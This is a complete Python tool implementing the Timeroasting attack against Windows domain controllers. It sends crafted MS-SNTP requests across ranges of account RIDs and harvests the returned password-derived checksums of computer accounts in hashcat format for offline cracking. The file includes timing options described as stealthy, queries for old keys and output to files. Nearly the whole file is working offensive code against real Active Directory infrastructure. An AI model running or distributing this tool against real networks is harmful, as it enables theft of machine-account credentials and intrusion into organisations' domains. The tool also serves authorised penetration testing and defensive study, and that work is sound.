#!/usr/bin/env python3
# Copyright (c) 2025 MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Reference:
#   - https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf
#
# Inspiration from:
#   - https://github.com/SecuraBV/Timeroast
#   - https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf

import sys
import pathlib
import socket
import struct
import threading
import select
import time
import itertools

try:
    # enable support for colored and no-color output
    from rich.console import Console

    RICH_CONSOLE = Console()
except ImportError:
    RICH_CONSOLE = None


# --- logging (yes, its ugly)
def error(*msg: str) -> None:
    if RICH_CONSOLE:
        RICH_CONSOLE.print(r"[bold red]\[!][/]", *msg)
    else:
        print("[!]", *msg)


def info(*msg: str) -> None:
    if RICH_CONSOLE:
        RICH_CONSOLE.print(r"[blue]\[*][/]", *msg)
    else:
        print("[*]", *msg)


def fine(*msg: str) -> None:
    if RICH_CONSOLE:
        RICH_CONSOLE.print(r"[green]\[+][/]", *msg)
    else:
        print("[+]", *msg)


# Specifies to apply the older cryptographic key of the pair of keys associated
# with the account.
USE_OLD_PWD = 1 << 31

# RID mask applied to each key identifier
KEY_ID_MASK = (1 << 30) - 1


# Client / Server NTP Request / Response (Authenticator)
class Authenticator:
    # must be 68 bytes
    length = 68

    # Fields:
    # - Key Identifier (4 bytes): This field identifies the cryptographic key used to
    #   generate the crypto-checksum. The first 31 bits represent the relative Identifier
    #   (RID) of a user account (must be trusted).
    key_id: int

    # - Crypto-Checksum (16 bytes):  A 128-bit crypto-checksum that the encryption
    #   procedure computes. MOST IMPORTANTLY (request only):
    #       "Windows implementations of the protocol client set this field to 0, and Windows
    #       implementations of the protocol server IGNORE this field."
    #   This checksum is calculated using the first 48 bytes of the generated response message,
    #   therefore only relevant in server response packets.
    checksum: bytes

    def __init__(self, data=None, rid: int = -1):
        if data is None:
            self.key_id = rid if rid >= 0 else 0
            self.checksum = bytes(16)
        else:
            (self.key_id, self.checksum) = struct.unpack("<I16s", data[:20])

    def build_ntp_packet(self) -> bytes:
        return NTP_TEMPLATE + struct.pack("<I", self.key_id) + self.checksum

    def to_hashcat_format(self, salt: bytes, no_key_id: bool = False) -> str:
        key_md5 = self.checksum.hex()
        hashvalue = f"$sntp-ms${key_md5}${salt.hex()}"
        if not no_key_id:
            rid = self.key_id & KEY_ID_MASK
            return f"{rid}:{hashvalue}"
        # hashcat format but without --username argument
        return hashvalue


# Specifies to apply the older cryptographic key of the pair of keys associated
# with the account.
USE_OLDKEY_VERSION = 0x00000001


# Client supports crypto mechanism that includes KDF and HMACSHA512
NTLM_PWD_HASH = 0x00000001


# REVISIT: maybe add support for extended requests in the future
# Client/Server NTP Request/Response (ExtendedAuthenticator)
class ExtendedAuthenticator:
    # must be 120 bytes
    length = 120

    # Fields:
    # - Key Identifier (4 bytes): his field identifies the cryptographic key used to
    #   generate the crypto-checksum.
    key_id: int

    # - Reserved (1 byte): MUST be set to zero and MUST be ignored
    # reserved: int

    # - Flags (1 byte): An 8-bit, unsigned integer in little-endian byte order that contains
    #   additional options for processing. The following flags are allowed (currently defined):
    #       - USE_OLDKEY_VERSION (0x00000001):
    #         "The older cryptographic key of the pair of keys associated with the account
    #          is used."
    flags: int

    # - ClientHashIDHints (1 Byte): An 8-bit, unsigned integer in little-endian byte order that
    #   describes the support for the mechanism to calculate the crypto-checksum.
    #       - NTLM_PWD_HASH (0x00000001):
    #         This client supports the modern crypto-checksum calculation using a KDF and
    #         HMACSHA512.
    client_hash_id_hints: int

    # - SignatureHashID (1 byte): An 8-bit, unsigned integer in little-endian byte order that
    #   describes the mechanism used to calculate the checksum.
    signature_hash_id: int

    # - Crypto-Checksum (64 bytes): A 512-bit crypto-checksum that the encryption procedure
    #   computes.
    checksum: bytes

    def __init__(
        self,
        data=None,
        rid: int = -1,
        flags: int = 0,
        client_hash_id_hints: int = 0,
        signature_hash_id: int = 0,
    ):
        # super().__init__(data, alignment=0)
        if data is None:
            self.key_id = rid if rid >= 0 else 0
            # set optional attributes
            self.flags = flags
            self.client_hash_id_hints = client_hash_id_hints
            self.signature_hash_id = signature_hash_id
            self.checksum = bytes(64)
        else:
            (
                self.key_id,
                _,  # reserved
                self.flags,
                self.client_hash_id_hints,
                self.signature_hash_id,
                self.checksum,
            ) = struct.unpack("<IBBBB64s", data[:72])

    def build_ntp_packet(self) -> bytes:
        # according to the spec, we have to set some values regardless of whether
        # we set them before:
        #  - ClientHashIDHints: MUST be set to NTLM_PWD_HASH.
        self.client_hash_id_hints = NTLM_PWD_HASH
        #  - SignatureHashID: MUST be set to zero.
        self.signature_hash_id = 0
        #  - Crypto-Checksum: MUST be set to zero.
        self.checksum = bytes(64)

        options = bytes(
            [
                0x00,
                self.flags,
                self.client_hash_id_hints,
                self.signature_hash_id,
            ]
        )

        return NTP_TEMPLATE + struct.pack("<I", self.key_id) + options + self.checksum


# Empty NTP packet generated with scapy.layers.NTPHeader.build(). As we just need
# the authenticator extension, all other fields are irrelevant and can be omitted.
NTP_TEMPLATE = bytes.fromhex("23020a" + ("0" * 90))


# Custom iterator class used later on to store all RIDs as ranges
class RIDRanges:
    # minimum RID
    MIN = 0
    # maximum RID that can be used
    MAX = (2**32) - 1

    def __init__(self) -> None:
        self.ranges = []
        self.single_numbers = set()
        self.ranges.append(self.single_numbers)

    def __len__(self) -> int:
        return len(self.ranges)

    def elements(self):
        # We use the generator behaviour here to create an iterator
        # over all possible elements
        return itertools.chain(*self.ranges)

    @staticmethod
    def rid_from_string(value: str) -> int:
        # REVISIT: maybe add support for HEX values
        try:
            return max(min(int(value), RIDRanges.MAX), RIDRanges.MIN)
        except ValueError as e:
            error(f"Could not parse RID: {e}")
            sys.exit(1)

    def extend_from_string(self, value: str) -> None:
        # Format:
        #   [start][-][stop][, ...]
        for range_format_raw in value.split(","):
            range_format = range_format_raw.strip()
            if range_format == "-":
                # add range from zero to max value (minus one, because last
                # one is the key flag)
                self.ranges.append(iter(range(RIDRanges.MIN, RIDRanges.MAX)))
                continue

            if "-" not in range_format:
                # must be a number: errors will be reported immediately
                rid_element = RIDRanges.rid_from_string(range_format)
                self.single_numbers.add(rid_element)
                continue

            start, stop = range_format.split("-", 1)
            self.ranges.append(
                iter(
                    range(
                        RIDRanges.rid_from_string(start or str(RIDRanges.MIN)),
                        RIDRanges.rid_from_string(stop or str(RIDRanges.MAX)),
                    )
                )
            )

    # helper method to create RID ranges from a format string
    @staticmethod
    def from_string(value: str):
        obj = RIDRanges()
        obj.extend_from_string(value)
        return obj


# Simple and basic NTP client that implements a simple blocking-IO socket
# that can send and receive NTP UDP packets from a given target address.
#
# Additionally, this client implements the context manager protocol:
#   with NTPClient(...) as client:
#       ...
# Example see below.
class NTPClient:
    def __init__(
        self,
        bind_address: str | None = None,
        bind_port: int | None = None,
        timeout: float | None = None,
    ) -> None:
        self.bind_address = (bind_address or "0.0.0.0", bind_port or 0)
        # NOTE:the socket created here operates in blocking mode. Non-Blocking
        # can be enabled in .set_blocking(False)
        self._client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._client.settimeout(timeout)
        self.bulk_complete = threading.Event()

    def __enter__(self):
        self._client.bind(self.bind_address)
        return self

    def __exit__(self, *_) -> None:
        self._client.close()

    def set_blocking(self, mode: bool) -> None:
        self._client.setblocking(mode)

    def recvfrom(self, target_address: str, target_port: int = 123) -> bytes | None:
        # dirty hack to receive the right packet
        while True:
            try:
                data, (address, port) = self._client.recvfrom(2048)
            except TimeoutError:
                return None

            if address == target_address and port == target_port:
                return data

    def recv_simple_authenticator(
        self,
        target_rid: int,
        target_address: str,
        target_port: int = 123,
    ) -> tuple[bytes, Authenticator] | None:
        # REVISIT: are these checks necessary?
        data = self.recvfrom(target_address, target_port)
        if data is None:
            return None

        if len(data) != Authenticator.length:
            error(
                f"Received unexpected response from server with {len(data)} bytes "
                f"for RID({target_rid})!"
            )
            return None

        auth = Authenticator(data=data[48:])
        recv_rid = auth.key_id & KEY_ID_MASK
        if recv_rid != target_rid:
            error(
                "Received invalid response from server with different RID: "
                f"src={target_rid}, got {recv_rid}"
            )
        return data[:48], auth

    def sendto(
        self,
        payload: bytes,
        target_address: str,
        target_port: int = 123,
    ) -> None:
        self._client.sendto(payload, (target_address, target_port))


def recv_worker(argv, client: NTPClient):
    # the event ensures that we won't listen forever
    while not client.bulk_complete.is_set():
        ready, [], exceptional = select.select([client._client], [], [], argv.timeout)
        if exceptional:
            break

        if ready:
            try:
                # If you kill the parent thread too quickly, we don't want to
                # see any errors.
                reply, _ = client._client.recvfrom(2048)
            except OSError:
                break
            if len(reply) == Authenticator.length:
                salt = reply[:48]
                auth = Authenticator(data=reply[48:])
                # report valid response one-time only
                # if auth.key_id & USE_OLD_PWD == 0 or argv.only_oldkey:
                #     fine(f"Got valid response for RID: {auth.key_id & KEY_ID_MASK}")

                report_hash(argv, auth, salt)


def report_hash(argv, auth: Authenticator, salt: bytes) -> None:
    sntpms_hash = auth.to_hashcat_format(salt, argv.outfile_no_rid)
    print(sntpms_hash)
    if argv.outfile:
        argv.outfile.write(sntpms_hash + "\n")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description=(
            "Implementation of the Timeroasting attack to grab hashes from computer accounts "
            "using SNTP-MS."
        ),
    )
    parser.add_argument(
        "-no-color",
        action="store_true",
        help="disables colorized output (enabled by default if rich is not installed)",
    )
    # target options
    target_group = parser.add_argument_group("Target Options")
    target_group.add_argument(
        "target",
        type=str,
        metavar="dc_ip",
        help="Target Domain Controller IP address or host.",
    )
    target_group.add_argument(
        "-rt",
        type=argparse.FileType(encoding="utf-8"),
        default=None,
        dest="rid_targetfile",
        metavar="RID_FILE",
        help=(
            "Path to a file containing relative identifiers (RIDs) to target (TargetedTimeroast). "
            "Each line will be interpreted as a RID range."
        ),
    )
    target_group.add_argument(
        "-r",
        "-range",
        type=RIDRanges.from_string,
        default=RIDRanges(),
        dest="ranges",
        help=(
            "Set the RID brute force range(s). Format is [start][-][end][, ...], "
            "whereby one element must be present. For instance, '1-10' would be "
            "valid and '-10' or '10-' too. You can use '-' to try ALL available "
            "RIDs (0 to (1 << 31) - 1). If start is not specified it will be set"
            " to zero and end will be UINT32_MAX - 1."
        ),
    )

    # Collection options
    collection_group = parser.add_argument_group("Collection Options")
    collection_group.add_argument(
        "-use-oldkey",
        dest="use_oldkey",
        action="store_true",
        help="Queries for the old password upon receiving a valid responce from the target server.",
    )
    collection_group.add_argument(
        "-only-oldkey",
        dest="only_oldkey",
        action="store_true",
        help="Only queries for the old password of the machine account",
    )
    collection_group.add_argument(
        "-skip-duplicate",
        dest="skip_duplicates",
        action="store_true",
        help=(
            "Collects only new hashes. (Only together with -append and -outfile) "
            "This will work only if the RID has been written to the hashes file."
        ),
    )

    timing_group = parser.add_argument_group("Timing options")
    timing_group.add_argument(
        "-non-blocking",
        dest="non_blocking",
        action="store_true",
        help="Executes in non-blocking mode",
    )
    timing_group.add_argument(
        "-wait",
        dest="wait",
        type=float,
        default=0.5,
        metavar="SECONDS",
        help=(
            "Waits X seconds (float) after sending all requests (non-blocking "
            "mode only). Default delay is 0.5s."
        ),
    )
    timing_group.add_argument(
        "-T",
        dest="delay",
        type=int,
        metavar="<0-5>",
        default=4,
        choices=[i for i in range(6)],
        help="Set timing template (higher is faster). Default template is T4.",
    )
    timing_group.add_argument(
        "-timeout",
        dest="timeout",
        type=float,
        default=0.01,
        help=(
            "Timeout for local socket (blocking-mode) / refesh interval (non"
            "-blocking mode) in seconds (default=0.01)"
        ),
    )

    parser.add_argument(
        "-l",
        "--listener",
        dest="bind_address",
        metavar="ADDR",
        default="0.0.0.0",
        help="Local address to listen on",
        type=str,
    )
    # output options
    output_group = parser.add_argument_group("Output Options")
    output_group.add_argument(
        "-outfile",
        dest="outfile",
        type=pathlib.Path,
        help=(
            "Stores the captured hashes into the given file. (use -append to add data "
            "to an existing file)"
        ),
    )
    output_group.add_argument(
        "-append",
        dest="outfile_append",
        action="store_true",
        help="Does not overwrite existing captured hashes",
    )
    output_group.add_argument(
        "-no-userid",
        dest="outfile_no_rid",
        action="store_true",
        help="Remove RID from output hash (otherwise --username must be used with hashcat)",
    )

    argv = parser.parse_args()
    if argv.no_color:
        RICH_CONSOLE = None

    if (
        not argv.rid_targetfile
        and len(argv.ranges) == 1
        and len(argv.ranges.ranges[0]) == 0
    ):
        error("One or multiple RIDs must be specified!")
        sys.exit(1)

    match argv.delay:
        case 1:
            # slowest and stealthiest method (2 seconds)
            argv.delay = 1
        case 2:
            argv.delay = 0.5
        case 4:
            argv.delay = 0.05
        case 5:
            # are you crazy?
            argv.delay = 0
        case _:
            # default template is 0.25 seconds
            argv.delay = 0.25

    present_rids = set()
    if argv.outfile:
        if argv.outfile_append:
            if not argv.outfile.exists():
                error("Output file does not exist while called with option '-append'!")
                sys.exit(1)

            if argv.skip_duplicates:
                # Collect previous hashes and skip already found
                for hashvalue in argv.outfile.read_text().splitlines():
                    if ":" in hashvalue:
                        present_rids.add(hashvalue.split(":", 1)[0])

        else:
            if argv.skip_duplicates:
                error(
                    "Can't skip duplicates if target output file does not exist! (maybe missing -append?)"
                )
                sys.exit(1)

        argv.outfile = argv.outfile.open("w" if not argv.outfile_append else "a")

    if argv.rid_targetfile:
        info("Using RIDs from given targets file")
        for line in argv.rid_targetfile.readlines():
            argv.ranges.extend_from_string(line)

    if not argv.outfile_no_rid:
        info(
            "User RID will be added to the output hash - make sure to use --username with hashcat to crack them!"
        )

    info(f"Starting Timeroasting attack against: {argv.target}")
    try:
        with NTPClient(argv.bind_address, timeout=argv.timeout) as ntp_client:
            if argv.non_blocking:
                ntp_client.set_blocking(False)
                worker = threading.Thread(
                    target=recv_worker,
                    kwargs={"client": ntp_client, "argv": argv},
                )
                worker.start()

            for rid in argv.ranges.elements():
                if argv.skip_duplicates and str(rid) in present_rids:
                    continue

                if argv.delay:
                    time.sleep(argv.delay)
                auth_req = Authenticator(
                    rid=rid if not argv.only_oldkey else rid | USE_OLD_PWD
                )
                payload = auth_req.build_ntp_packet()

                ntp_client.sendto(payload, argv.target)
                if argv.non_blocking:
                    if argv.use_oldkey and not argv.only_oldkey:
                        auth_req.key_id = rid | USE_OLD_PWD
                        ntp_client.sendto(auth_req.build_ntp_packet(), argv.target)
                    continue

                data = ntp_client.recv_simple_authenticator(rid, argv.target)
                if data is None:
                    continue

                salt, auth_resp = data
                fine(f"Got valid response for RID: {rid}")
                report_hash(argv, auth_resp, salt)
                if argv.use_oldkey and not argv.only_oldkey:
                    auth_req.key_id = rid | USE_OLD_PWD
                    ntp_client.sendto(auth_req.build_ntp_packet(), argv.target)
                    data = ntp_client.recv_simple_authenticator(rid, argv.target)
                    if data is not None:
                        salt, old_auth_resp = data
                        report_hash(argv, old_auth_resp, salt)

            if argv.non_blocking:
                if argv.wait:
                    time.sleep(argv.wait)

                ntp_client.bulk_complete.set()
                worker.join()
    except KeyboardInterrupt:
        error("Quitting session")

    if argv.outfile:
        argv.outfile.close()
